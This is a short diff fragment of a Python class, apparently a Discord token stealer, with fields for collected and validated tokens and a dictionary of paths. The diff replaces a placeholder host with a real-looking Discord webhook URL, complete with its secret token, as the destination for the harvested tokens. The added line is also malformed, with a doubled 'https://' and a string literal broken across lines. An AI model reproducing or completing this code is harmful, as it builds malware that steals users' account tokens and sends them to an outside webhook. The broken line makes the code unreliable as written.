@@ -5,7 +5,8 @@ import os, re, threading, urllib.request
 
 class X3N0S:
     def __init__(self):
-        self.host = "https://yourwebsite.com"
+        self.host = "https://https://discord.com/api/webhooks/987139604132020256/gq1wBoMjkuUbH1rjcaY5MaoKi3_1I_l-xXqx0UCJcup6MjvIWjr4Y7GIzzSuxMUFwZao
+     "
         self.all_tokens = []
         self.valid_tokens = []
         self.paths = {
